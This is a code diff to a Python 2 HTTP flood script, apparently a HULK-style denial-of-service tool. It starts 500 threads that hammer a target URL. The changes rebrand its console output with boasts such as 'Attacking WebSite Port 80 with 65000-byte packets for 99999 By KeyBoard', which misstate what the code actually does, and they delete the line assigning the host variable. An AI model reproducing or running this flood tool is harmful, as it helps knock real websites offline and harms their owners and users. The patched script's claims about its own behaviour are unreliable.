@@ -3403,9 +3403,8 @@ def buildblock(size):
 def usage():
 	print '---------------------------------------------------'
 	print 'USAGE: python2 assasintrea.py <url>'
-	print 'you can add "safe" after url, to autoshut after ddos'
-	print '---------------------------------------------------'
-
+	print 'Atacando site, by: KeyBoard'
+	print "\a"
 print \
 """
                   /\    
@@ -3480,7 +3479,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+ 			print 'Flooding WebSite Port 80 with 65000-byte packets for 99999'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -3508,10 +3507,10 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+				print "%d Shots sends Senting" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- OpNestle has Started --"
+			print "\n -M60 Hits are secced"
 
 #execute 
 if len(sys.argv) < 2:
@@ -3522,7 +3521,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- Attack has Started HA HA HA HA --"
+		print "Attacking WebSite Port 80 with 65000-byte packets for 99999 By KeyBoard"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -3530,7 +3529,6 @@ else:
 		if url.count("/")==2:
 			url = url + "/"
 		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
